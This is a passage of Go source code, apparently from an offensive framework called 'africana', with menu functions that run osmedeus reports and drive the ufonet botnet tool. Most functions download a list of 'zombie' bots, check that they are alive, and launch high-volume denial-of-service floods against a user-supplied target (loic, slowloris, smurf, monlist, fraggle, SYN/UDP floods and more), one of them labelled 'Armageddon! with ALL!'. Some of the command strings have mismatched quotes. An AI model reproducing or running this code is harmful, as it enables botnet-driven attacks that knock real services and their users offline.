    userPort, _ := reader.ReadString('\n')
    userPort = strings.TrimSpace(userPort)
    if userPort == "" {
        userPort = "3333"
    }
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Started Osmedeusweb UI server on " + bcolors.RED + "localhost:%s", userPort + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenThree(`script -q -c 'osmedeus server --port %s' -O %s`, userPort, Logs); fmt.Println()
}

func Osmedeus9() {
    Logs := fmt.Sprintf("/root/.africana/logs/Osmedeus9.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Showing scanned osmedeus report list " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'osmedeus report list' -O %s`, Logs); fmt.Println()
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Pleas select a target to expand list" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🔮" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" +  bcolors.GREEN + ")# " + bcolors.ENDC)
    fmt.Scan(&chosenTarget)
    fmt.Printf(bcolors.RED + "\n(More results for = %s)", chosenTarget + bcolors.ENDC)
    subprocess.PopenThree(`script -q -c 'osmedeus report view --static -t %s' -O %s`, chosenTarget, Logs); fmt.Println()
}

func Ufonet1() {
    Logs := fmt.Sprintf("/root/.africana/logs/Ufonet1.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Downloading list of bots from C.S " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/ufonet/; python3 ufonet --download-zombies' -O %s`, Logs); fmt.Println()
}

func Ufonet2() {
    Logs := fmt.Sprintf("/root/.africana/logs/Ufonet2.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Testing If all bots are alive & ready to launch " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/ufonet/; python3 ufonet -t botnet/zombies.txt' -O %s`, Logs); fmt.Println()
}

func Ufonet3(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Ufonet3.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched Palantir 3.14 on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"' -O %s`, userTarget, Logs); fmt.Println()
}

func Ufonet4(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Ufonet4.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched Socking_waves (instant-knockout!) on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"' -O %s`, userTarget, Logs); fmt.Println()
}

func Ufonet5(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Ufonet5.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched xcom-1 (only DDoS) on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"' -O %s`, userTarget, Logs); fmt.Println()
}

func Ufonet6(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Ufonet6.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched xcom-2 (only DoS) on" + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"' -O %s`, userTarget, Logs); fmt.Println()
}

func Ufonet7() {
    Logs := fmt.Sprintf("/root/.africana/logs/Ufonet7.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched ufonet UI on http://localhost:9999 " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/ufonet/; python3 ufonet --gui' -O %s`, Logs); fmt.Println()
}

func Ufonet8() {
    Logs := fmt.Sprintf("/root/.africana/logs/Ufonet8.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Started Grider ufonet --grider  " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/ufonet/; python3 ufonet --grider' -O %s`, Logs); fmt.Println()
}

func Ufonet9(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Ufonet9.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched Armageddon! with ALL! " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"' -O %s`, userTarget, Logs); fmt.Println()
}
